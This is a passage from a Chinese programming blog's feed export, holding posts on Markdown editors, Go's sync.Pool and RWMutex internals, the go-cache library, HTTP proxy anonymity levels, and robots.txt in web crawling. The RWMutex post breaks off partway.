<p>为了省事儿，很多软件的跨平台，实际上都是js的功劳。启示还是有很多js框架做的不错的，譬如 <a href="https://github.com/electron/electron" target="_blank" rel="noopener">Electron</a>，然而小书匠用的这个是<a href="https://github.com/nwjs/nw.js" target="_blank" rel="noopener">nwjs</a>。感觉上会稍微不那么原生。最基本的，对于一个Mac用户来说，它不支持最大化就罢了，关闭、满窗口（非最大化）、最小化三个按钮居然还在界面右端，非常不习惯。</p>
<p>不过这些并不足以让我放弃一个编辑器，让我最终放弃它的原因是它对<code>Undo</code>的支持非常差。</p>
<p>假若你输入一段中文<code>今日头条</code>，输入完之后，点击<code>⌘</code>+<code>Z</code>进行Undo操作，你会得到一个字符串<code>jin&#39;ri&#39;tou&#39;tiao</code>，然后不停地点击<code>⌘</code>+<code>Z</code>，这堆英文字母才能挨个消失。这是让人无法忍受的。</p>
<p>而如果你先输入了中文<code>今日头条</code>，然后又使用delete键删除了<code>条</code>，这个时候你的界面上剩下<code>今日头</code>，你会发现你的<code>⌘</code>+<code>Z</code>键完全失效了。这种失灵也完全无法忍受。</p>
<p>这种问题很可能是js本身平台的问题，因为我尝试了网页版，也存在同样的问题。</p>
<p>当然，小书匠也有很多优点。一个是界面确实功能丰富，另外一个是它同步导入印象笔记是可编辑的，而且其markdown部分也作为附件存在了笔记下面。这让人看着安心，自己的信息一定不会丢失。</p>
<hr>
<h2 id="Cmd-Markdown"><a href="#Cmd-Markdown" class="headerlink" title="Cmd Markdown"></a>Cmd Markdown</h2><p>最后是Cmd Markdown，这一款笔记做的也非常好。</p>
<p>它支持Tex的公式，还支持流程图、时序图，甚至还支持甘特图。</p>
<p>不过它还是以自身为主，对于笔记平台的依赖性相对比较低。如果想要同步到印象笔记的话，得专门点击设置，然后用导出的方式来导出到笔记，这个是我不太希望的。我期待的结果是直接点击<code>⌘</code>+<code>S</code>就给我乖乖同步到印象笔记，这个功能，前面两款做的都非常好。</p>
<p>更何况，从cmd markdown导出到印象笔记还需要充会员，连试用的机会都没有，￥90/year。</p>
<p>马克飞象和小书匠都支持非常非常丰富的主题列表，而cmd markdown对主题的支持相对来说简陋了一些，只支持亮暗两种。</p>
<p>cmd markdown的展示还是非常方便的，当文档写得好的话，就直接不需要专门做Keynote了。</p>
<hr>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这些编辑器有一些共同的优点，譬如他们都支持导出，都支持非常程序员喜爱的操作方式，导出方式，保存方式。甚至是把数据仓库都指示了出来。</p>
<p>它们都是全平台的工具，而且都支持加载很快，非常方便的web端，效率比Google Docs高得多。因此，它们都一定程度上解决了印象笔记的痛点，当然，有的时候也会不小心引入新的痛点。</p>
<p>从我的选择上来说，还是选择马克飞象了。</p>
<p>对于效率工具这方面，大家都不要吝惜自己的小钱钱，毕竟这是能够给你带来更大价值的工具。</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;今天来比较三款MarkDown工具。入选的三个工具分别叫做&lt;code&gt;马克飞象&lt;/code&gt;、&lt;code&gt;小书匠&lt;/code&gt;、&lt;code&gt;作业部落Cmd Markdown&lt;/code&gt;。入选的必要条件是支持所有的终端，且可以导到其他的笔记平台。单个端的Markdown解析器、或者文本编辑器的插件之类的，不在今天的讨论之列。&lt;/p&gt;
    
    </summary>
    
      <category term="个人随笔" scheme="http://zablog.me/categories/%E4%B8%AA%E4%BA%BA%E9%9A%8F%E7%AC%94/"/>
    
    
      <category term="Markdown" scheme="http://zablog.me/tags/Markdown/"/>
    
  </entry>
  
  <entry>
    <title>Go语言小技巧——合理使用Pool</title>
    <link href="http://zablog.me/2017/12/13/go_pool/"/>
    <id>http://zablog.me/2017/12/13/go_pool/</id>
    <published>2017-12-13T13:00:00.000Z</published>
    <updated>2017-12-13T09:29:09.000Z</updated>
    
    <content type="html"><![CDATA[<p>垃圾回收一直是Go语言的一块心病，在它执行垃圾回收的时间中，你很难做什么。<br>在垃圾回收压力大的服务中，GC占据的CPU有可能超过2%，造成的Pause经常超过2ms。垃圾严重的时候，秒级的GC也出现过。<br>如果经常临时使用一些大型结构体，可以用Pool来减少GC。</p>
<a id="more"></a>
<p>示例代码</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">package</span> main</div><div class="line"></div><div class="line"><span class="keyword">import</span> (</div><div class="line">	<span class="string">"fmt"</span></div><div class="line">	<span class="string">"sync"</span></div><div class="line">	<span class="string">"time"</span></div><div class="line">)</div><div class="line"></div><div class="line"><span class="keyword">type</span> structR6 <span class="keyword">struct</span> &#123;</div><div class="line">	B1 [<span class="number">100000</span>]<span class="keyword">int</span></div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">var</span> r6Pool = sync.Pool&#123;</div><div class="line">	New: <span class="function"><span class="keyword">func</span><span class="params">()</span> <span class="title">interface</span></span>&#123;&#125; &#123;</div><div class="line">		<span class="keyword">return</span> <span class="built_in">new</span>(structR6)</div><div class="line">	&#125;,</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">func</span> <span class="title">usePool</span><span class="params">()</span></span> &#123;</div><div class="line">	startTime := time.Now()</div><div class="line">	<span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="number">10000</span>; i++ &#123;</div><div class="line">		sr6 := r6Pool.Get().(*structR6)</div><div class="line">		sr6.B1[<span class="number">0</span>] = <span class="number">0</span></div><div class="line">		r6Pool.Put(sr6)</div><div class="line">	&#125;</div><div class="line">	fmt.Println(<span class="string">"pool Used:"</span>, time.Since(startTime))</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">func</span> <span class="title">standard</span><span class="params">()</span></span> &#123;</div><div class="line">	startTime := time.Now()</div><div class="line">	<span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="number">10000</span>; i++ &#123;</div><div class="line">		<span class="keyword">var</span> sr6 structR6</div><div class="line">		sr6.B1[<span class="number">0</span>] = <span class="number">0</span></div><div class="line">	&#125;</div><div class="line">	fmt.Println(<span class="string">"standard Used:"</span>, time.Since(startTime))</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</div><div class="line">	standard()</div><div class="line">	usePool()</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>一个含有100000个int值的结构体，在标准方法中，每次均新建，重复10000次，一共需要耗费193ms；<br>如果用完的struct可以废物利用，放回pool中。需要新的结构体的时候，尝试去pool中取，而不是重新生成，重复10000次仅需要693us。<br>这样简单的操作，却节约了99.65%的时间，也节约了各方面的资源。最重要的是它可以有效减少GC CPU和GC Pause。</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;垃圾回收一直是Go语言的一块心病，在它执行垃圾回收的时间中，你很难做什么。&lt;br&gt;在垃圾回收压力大的服务中，GC占据的CPU有可能超过2%，造成的Pause经常超过2ms。垃圾严重的时候，秒级的GC也出现过。&lt;br&gt;如果经常临时使用一些大型结构体，可以用Pool来减少GC。&lt;/p&gt;
    
    </summary>
    
      <category term="个人随笔" scheme="http://zablog.me/categories/%E4%B8%AA%E4%BA%BA%E9%9A%8F%E7%AC%94/"/>
    
    
      <category term="go" scheme="http://zablog.me/tags/go/"/>
    
  </entry>
  
  <entry>
    <title>匿名代理、透传代理和精英代理之间的区别</title>
    <link href="http://zablog.me/2017/12/04/proxy/"/>
    <id>http://zablog.me/2017/12/04/proxy/</id>
    <published>2017-12-04T13:00:00.000Z</published>
    <updated>2018-09-10T12:29:07.173Z</updated>
    
    <content type="html"><![CDATA[<p>匿名代理、透传代理和精英代理之间的区别 / differences between transparent, anonymous and elite proxy<br><a id="more"></a></p>
<p>作为一个代理的普通用户，你也许不知道你在用的代理到底是透明的，匿名的还是精英的。<br>你也许会倾向于使用精英代理，正如它名字指示的那样。那么这几种代理到底有什么区别呢？</p>
<p>首先，代理一般会在HTTP的Header中传输以下3个字段：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">REMOTE_ADDR</div><div class="line">HTTP_X_FORWARDED_FOR</div><div class="line">HTTP_VIA</div></pre></td></tr></table></figure>
<p>REMOTE_ADDR总是发送代理服务器的IP地址。</p>
<h2 id="透传代理"><a href="#透传代理" class="headerlink" title="透传代理"></a>透传代理</h2><p>对于透传代理（Transparent Proxy）来说，你真实IP地址会被放在HTTP_X_FORWARDED_FOR里面。这意味着网站可以知道代理的IP，还知道你真正的IP地址。<br>HTTP_VIA头也会发送，显示你正在使用代理服务器</p>
<h2 id="匿名代理"><a href="#匿名代理" class="headerlink" title="匿名代理"></a>匿名代理</h2><p>匿名代理不会把你的真实IP写在<code>HTTP_X_FORWARDED_FOR</code>头里面。但是HTTP_VIA头还是透露了您正在使用一个代理服务器。</p>
<h2 id="精英代理"><a href="#精英代理" class="headerlink" title="精英代理"></a>精英代理</h2><p>精英代理只发送REMOTE_ADDR头,因此让你看起来像一个普通互联网用户不使用代理。</p>
<h2 id="检测精英代理"><a href="#检测精英代理" class="headerlink" title="检测精英代理"></a>检测精英代理</h2><p>精英代理并非不可以检测。<br>网站可以检查这个IP，是否使用了常用的代理接口（如8080、3128、8080、3128）。</p>
<p>可以使用以下网站来检测你是否匿名:<a href="http://whoer.net/ext" target="_blank" rel="noopener">http://whoer.net/ext</a> 或 <a href="https://whoer.net/zh#extended" target="_blank" rel="noopener">https://whoer.net/zh#extended</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;匿名代理、透传代理和精英代理之间的区别 / differences between transparent, anonymous and elite proxy&lt;br&gt;
    
    </summary>
    
      <category term="个人随笔" scheme="http://zablog.me/categories/%E4%B8%AA%E4%BA%BA%E9%9A%8F%E7%AC%94/"/>
    
    
      <category term="技术随笔" scheme="http://zablog.me/tags/%E6%8A%80%E6%9C%AF%E9%9A%8F%E7%AC%94/"/>
    
  </entry>
  
  <entry>
    <title>爬虫小纪</title>
    <link href="http://zablog.me/2017/11/12/crawler/"/>
    <id>http://zablog.me/2017/11/12/crawler/</id>
    <published>2017-11-12T13:00:00.000Z</published>
    <updated>2018-12-23T06:11:50.986Z</updated>
    
    <content type="html"><![CDATA[<p>最近比较繁忙，所以博客也没有什么新文章。<br>说一下爬虫吧。<br>自从互联网时代开始，爬虫就没停止活跃…恐怕今后很长一段时间爬虫都会长期存在。当人们谈到XSS、DDos、SQL injection、SSL attacks的时候，多数你在谈论计算机安全，当你谈到爬虫的时候，你更多的在关心内容安全。爬虫有时候会涉及内容安全，有些内容是别人的立站根本，譬如PGC、UGC的文章；有的内容是别人的商业机密，譬如酒店、商品的价格。</p>
<p>对于爬虫来说，有没有规范定义它不允许爬取的内容呢。有一个文件叫做robots.txt，它是是一种存放于网站根目录下的ASCII编码的文本文件，通常用来告诉搜索引擎的爬取器哪些内容是不应该被获取的。</p>
<p>曾经阿里巴巴有一个很火的网站<a href="http://etao.com/" target="_blank" rel="noopener">一淘</a>，这个网站的最大优势是可以在线比价。它可以将一件商品在各个平台上的价格放在一起，消费者可以在这里瞬间看到很多平台的价格，从而找到最便宜的。</p>
<p>而更杀手级的功能是，它提供历史价格的功能。譬如对于京东来说，它可以看到京东里面某件商品的价格历史。当前虽然在搞促销，但是也许并非历史最低价格，消费者可能就继续观望了。</p>
<p>这对京东这种商家的损害很大，一淘这样就侵犯京东的商业机密了。京东不希望别人知道一件商品的价格历史。所以，京东的robots.txt设置为了这样：<a href="https://www.jd.com/robots.txt" target="_blank" rel="noopener">robots.txt</a><br>其中有一条写作：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">User-agent: EtaoSpider </div><div class="line">Disallow: /</div></pre></td></tr></table></figure></p>
<p>也就是说，对于Etao的爬虫来说，我不允许你爬取京东的任何内容。</p>
<p>一淘是阿里旗下的，所以这个竞争对手是不希望被允许的了。这个市场看起来被一个不太知名的网站“慢慢买”占了。</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;最近比较繁忙，所以博客也没有什么新文章。&lt;br&gt;说一下爬虫吧。&lt;br&gt;自从互联网时代开始，爬虫就没停止活跃…恐怕今后很长一段时间爬虫都会长期存在。当人们谈到XSS、DDos、SQL injection、SSL attacks的时候，多数你在谈论计算机安全，当你谈到爬虫的时候
    
    </summary>
    
      <category term="个人随笔" scheme="http://zablog.me/categories/%E4%B8%AA%E4%BA%BA%E9%9A%8F%E7%AC%94/"/>
    
    
      <category term="crawler" scheme="http://zablog.me/tags/crawler/"/>
    
  </entry>
  
  <entry>
    <title>每周一个Github项目【第八期】go-cache</title>
    <link href="http://zablog.me/2017/10/08/github_go-cache/"/>
    <id>http://zablog.me/2017/10/08/github_go-cache/</id>
    <published>2017-10-08T10:00:00.000Z</published>
    <updated>2017-10-09T13:03:25.000Z</updated>
    
    <content type="html"><![CDATA[<p>用Go实现的驻留内存的键值对存储/高速缓存（类似Memcached），适合单机应用 // An in-memory key:value store/cache (similar to Memcached) library for Go, suitable for single-machine applications.<br><a id="more"></a></p>
<table>
<thead>
<tr>
<th>名称</th>
<th>go-cache</th>
</tr>
</thead>
<tbody>
<tr>
<td>地址</td>
<td><a href="https://github.com/patrickmn/go-cache" target="_blank" rel="noopener">Github</a></td>
</tr>
<tr>
<td>作者</td>
<td><a href="https://github.com/patrickmn" target="_blank" rel="noopener">patrickmn</a>等</td>
</tr>
<tr>
<td>Brief Intro</td>
<td>An in-memory key:value store/cache (similar to Memcached) library for Go, suitable for single-machine applications.</td>
</tr>
<tr>
<td>LICENSE</td>
<td>MIT</td>
</tr>
<tr>
<td>starts</td>
<td>1,119</td>
</tr>
</tbody>
</table>
<p>go-cache是一个驻留内存的键值对存储/高速缓存（类似Memcached），适合单机应用。<br>它大致上可以认为是一个线程安全的<code>map[string]interface{}</code>，同时支持时间过期。</p>
<p>任何对象都可以被存储，可以指定过期时间，也可以指定为永久存在。go-cache是线程安全的。</p>
<p>虽然go-cache并非作为持久存储而设计的，但是整个高速缓存的内容可以通过<code>c.Items()</code>序列化以后存储，然后使用<code>NewFrom()</code>重新加载。</p>
<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">go get github.com/patrickmn/go-cache</div></pre></td></tr></table></figure>
<p>用法</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> (</div><div class="line">	<span class="string">"fmt"</span></div><div class="line">	<span class="string">"github.com/patrickmn/go-cache"</span></div><div class="line">	<span class="string">"time"</span></div><div class="line">)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</div><div class="line">	<span class="comment">// 创建一个默认过期时间为5分钟，清理间隔时间为10分钟的高速缓存</span></div><div class="line">	c := cache.New(<span class="number">5</span>*time.Minute, <span class="number">10</span>*time.Minute)</div><div class="line"></div><div class="line">	<span class="comment">// 设置“foo”键的值为“bar”，默认过期时间</span></div><div class="line">	c.Set(<span class="string">"foo"</span>, <span class="string">"bar"</span>, cache.DefaultExpiration)</div><div class="line"></div><div class="line">	<span class="comment">// 设置“baz”为42，不过期</span></div><div class="line">	<span class="comment">// 如果没有重置或者删除的话，它不会被删除</span></div><div class="line">	c.Set(<span class="string">"baz"</span>, <span class="number">42</span>, cache.NoExpiration)</div><div class="line"></div><div class="line">	<span class="comment">// 获取"foo"对应的字符串</span></div><div class="line">	foo, found := c.Get(<span class="string">"foo"</span>)</div><div class="line">	<span class="keyword">if</span> found &#123;</div><div class="line">		fmt.Println(foo)</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	<span class="comment">// 因为Go是一种静态类型语言，而cache可以存储任何类型，因此可以使用断言来判断任意类型</span></div><div class="line">	foo, found := c.Get(<span class="string">"foo"</span>)</div><div class="line">	<span class="keyword">if</span> found &#123;</div><div class="line">		MyFunction(foo.(<span class="keyword">string</span>))</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	<span class="comment">// 需要高性能？那就存指针吧</span></div><div class="line">	c.Set(<span class="string">"foo"</span>, &amp;MyStruct, cache.DefaultExpiration)</div><div class="line">	<span class="keyword">if</span> x, found := c.Get(<span class="string">"foo"</span>); found &#123;</div><div class="line">		foo := x.(*MyStruct)</div><div class="line">			<span class="comment">// ...</span></div><div class="line">	&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>用法相对很简单，实现也不难，具体文档参考<a href="https://godoc.org/github.com/patrickmn/go-cache" target="_blank" rel="noopener">文档</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;用Go实现的驻留内存的键值对存储/高速缓存（类似Memcached），适合单机应用 // An in-memory key:value store/cache (similar to Memcached) library for Go, suitable for single-machine applications.&lt;br&gt;
    
    </summary>
    
      <category term="个人随笔" scheme="http://zablog.me/categories/%E4%B8%AA%E4%BA%BA%E9%9A%8F%E7%AC%94/"/>
    
    
      <category term="Github Every Week" scheme="http://zablog.me/tags/Github-Every-Week/"/>
    
  </entry>
  
  <entry>
    <title>剖析Go的读写锁</title>
    <link href="http://zablog.me/2017/09/27/go_sync/"/>
    <id>http://zablog.me/2017/09/27/go_sync/</id>
    <published>2017-09-27T12:00:00.000Z</published>
    <updated>2017-09-28T02:40:00.000Z</updated>
    
    <content type="html"><![CDATA[<p>源码级剖析Go标准库中的sync.RWMutex。</p>
<a id="more"></a>
<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>RWMutex，读写锁，又称“读写互斥锁”。<br>读写锁简单来说就是可以由任意数量的读者同时使用，或者只由一个写者使用的锁。</p>
<p>读写锁和互斥量(<code>Mutex</code>)类似，但是比起互斥量有着更高的并行性，它允许多个读者同时读取，因此有一些特殊的应用场景。<br>在并发编程的很多场景下，数据的读取可能比写入更加频繁，这时就要允许多个线程同时读取一块内容。</p>
<h2 id="用例"><a href="#用例" class="headerlink" title="用例"></a>用例</h2><p>Go中，RWMutex的零值是一个未加锁的互斥量。</p>
<p>RWMutex使用起来相对比较简单，这里举一个简单的例子：</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">package</span> main</div><div class="line"></div><div class="line"><span class="keyword">import</span> (</div><div class="line">	<span class="string">"fmt"</span></div><div class="line">	<span class="string">"sync"</span></div><div class="line">	<span class="string">"time"</span></div><div class="line">)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</div><div class="line">	rw := <span class="built_in">new</span>(sync.RWMutex)</div><div class="line">	<span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="number">2</span>; i++ &#123;   <span class="comment">// 建立两个写者</span></div><div class="line">		<span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</div><div class="line">			<span class="keyword">for</span> j := <span class="number">0</span>; j &lt; <span class="number">3</span>; j++ &#123;</div><div class="line">				rw.Lock()</div><div class="line">				<span class="comment">// 写</span></div><div class="line">				rw.Unlock()</div><div class="line">			&#125;</div><div class="line">		&#125;()</div><div class="line">	&#125;</div><div class="line">	<span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="number">5</span>; i++ &#123;    <span class="comment">// 建立两个读者</span></div><div class="line">		<span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</div><div class="line">			<span class="keyword">for</span> j := <span class="number">0</span>; j &lt; <span class="number">3</span>; j++ &#123;</div><div class="line">				rw.RLock()</div><div class="line">				<span class="comment">// 读</span></div><div class="line">				rw.RUnlock()</div><div class="line">			&#125;</div><div class="line">		&#125;()</div><div class="line">	&#125;</div><div class="line">	time.Sleep(time.Second)</div><div class="line">	fmt.Println(<span class="string">"Done"</span>)</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p><a href="https://play.golang.org/p/joOSIM__Yg" target="_blank" rel="noopener"><strong>PlayGround</strong></a></p>
<h2 id="一个（神奇）优秀的（大坑）特性"><a href="#一个（神奇）优秀的（大坑）特性" class="headerlink" title="一个（神奇）优秀的（大坑）特性"></a>一个<del>（神奇）</del>优秀的<del>（大坑）</del>特性</h2><blockquote>
<p>读者在读的时候，不能够假定别的读者也能够获得锁。因此，禁止读锁嵌套。</p>
</blockquote>
<p>是不是有点儿绕？下面举个“七秒例”：🌰</p>
<ul>
<li>第一秒：读者1在第1秒成功申请了读锁</li>
<li>第二秒：写者1在第2秒申请写锁，申请失败，阻塞，但它会防止新的读者获锁</li>
<li>第三秒：读者2在第3秒申请读锁，申请失败</li>
<li>第四秒：读者1释放读锁，写者1获得写锁</li>
<li>第五秒：写者1释放写锁，读者2获得读锁</li>
<li>第六秒：读者1再次申请读锁，申请成功，与读者2共享</li>
<li>第七秒：读者1、读者2释放读锁，结束</li>
</ul>
<p>当写锁阻塞时，新的读锁是无法申请的，这可以有效防止写者饥饿。<em>如果一个线程因为某种原因，导致得不到CPU运行时间，这种状态被称之为</em> <strong><em>饥饿</em></strong>。</p>
<p>然而，这种机制也禁止了读锁嵌套。读锁嵌套可能造成死锁：</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">package</span> main</div><div class="line"></div><div class="line"><span class="keyword">import</span> (</div><div class="line">	<span class="string">"fmt"</span></div><div class="line">	<span class="string">"sync"</span></div><div class="line">	<span class="string">"time"</span></div><div class="line">)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</div><div class="line">	rw := <span class="built_in">new</span>(sync.RWMutex)</div><div class="line"></div><div class="line">	<span class="keyword">var</span> deadLockCase time.Duration = <span class="number">1</span></div><div class="line"></div><div class="line">	<span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</div><div class="line">		time.Sleep(time.Second * deadLockCase)</div><div class="line">		fmt.Println(<span class="string">"Writer Try"</span>)</div><div class="line">		rw.Lock()</div><div class="line">		fmt.Println(<span class="string">"Writer Fetch"</span>)</div><div class="line">		time.Sleep(time.Second * <span class="number">1</span>)</div><div class="line">		fmt.Println(<span class="string">"Writer Release"</span>)</div><div class="line">		rw.Unlock()</div><div class="line">	&#125;()</div><div class="line">	fmt.Println(<span class="string">"Reader 1 Try"</span>)</div><div class="line">	rw.RLock()</div><div class="line">	fmt.Println(<span class="string">"Reader 1 Fetch"</span>)</div><div class="line">	time.Sleep(time.Second * <span class="number">2</span>)</div><div class="line">	fmt.Println(<span class="string">"Reader 2 Try"</span>)</div><div class="line">	rw.RLock()</div><div class="line">	fmt.Println(<span class="string">"Reader 2 Fetch"</span>)</div><div class="line">	time.Sleep(time.Second * <span class="number">2</span>)</div><div class="line">	fmt.Println(<span class="string">"Reader 1 Release"</span>)</div><div class="line">	rw.RUnlock()</div><div class="line">	time.Sleep(time.Second * <span class="number">1</span>)</div><div class="line">	fmt.Println(<span class="string">"Reader 2 Release"</span>)</div><div class="line">	rw.RUnlock()</div><div class="line">	time.Sleep(time.Second * <span class="number">2</span>)</div><div class="line">	fmt.Println(<span class="string">"Done"</span>)</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>读者1和读者2是嵌套关系，按照这种时间安排，上述程序会导致死锁。</p>
<p>而有些死锁的可怕之处就在于，它不一定会发生。假设上面程序中的time.Sleep都是随机的时间，那么这一段代码每次的结果有可能不一致，这会给Debug带来极大的困难。</p>
<p><strong>吾闻读锁莫嵌套，写锁嵌套长已矣</strong>。（读锁嵌套了还有概率成功，写锁嵌套了100%完蛋🏥）</p>
<h2 id="源码剖析"><a href="#源码剖析" class="headerlink" title="源码剖析"></a>源码剖析</h2><p><sub>（源码具体内容、行数，以版本<code>go version 1.8.1</code>为例。）</sub></p>
<p>为了方便理解，可以把所有的<code>if race.Enabled {...}</code>扔掉不看。接下来，我们重述“七秒例”。🌰</p>
<p>第一秒，读者1请求读锁。</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">Line41: </div><div class="line">	<span class="keyword">if</span> atomic.AddInt32(&amp;rw.readerCount, <span class="number">1</span>) &lt; <span class="number">0</span> &#123;</div><div class="line">		<span class="comment">// A writer is pending, wait for it.</span></div><div class="line">		runtime_Semacquire(&amp;rw.readerSem)</div><div class="line">	&#125;</div></pre></td></tr></table></figure>
<p>读者数量<code>readerCount</code>开始是0，这个时候加1，变成了1，不符合判负条件所以跳出，成功获得读锁一枚。</p>
<p>第二秒，写者尝试获取写锁。第85行获取w的锁。不管这个读写锁有没有获取成功，先排斥别的写者。</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">Line85:</div><div class="line">	<span class="comment">// First, resolve competition with other writers.</span></div><div class="line">	rw.w.Lock()</div><div class="line">	<span class="comment">// Announce to readers there is a pending writer.</span></div><div class="line">	r := atomic.AddInt32(&amp;rw.readerCount, -rwmutexMaxReaders) + rwmutexMaxReaders</div><div class="line">	<span class="comment">// Wait for active readers.</span></div><div class="line">	<span class="keyword">if</span> r != <span class="number">0</span> &amp;&amp; atomic.AddInt32(&amp;rw.readerWait, r) != <span class="number">0</span> &#123;</div><div class="line">		runtime_Semacquire(&amp;rw.writerSem)</div><div class="line">	&#125;</div></pre></td></tr></table></figure>
<p>刚才说了，一个写者阻塞在这里的时候，也不会让新的读者去读了，所以它干了一件非常坏的事情：<br>把readerCount变成了1-rwmutexMaxReaders。<br>这样就能卡住新来的读者了。<br>接下来，算出r等于1。这意味着有当前有写者存在。<br>因为有读者，所以写者卡在了信号量<code>writerSem</code>上。但是它不甘心啊，心想“等完现在的这几个读者，我就要去写！”，它默默地把现在占有读锁的人记在了<del>小本本</del>rw.readerWait上。在本例子中，readerWait被设置为了1。</p>
<p>第三秒，读者2尝试获得读锁，它又来到了第41行，结果发现读者的数量是1-rwmutexMaxReaders，好吧，它只好卡在信号量<code>readerSem</code>上。</p>
<p>第四秒，读者1调用RUnlock()，它首先把读者数量减一，毕竟自己已经不读了。</p>
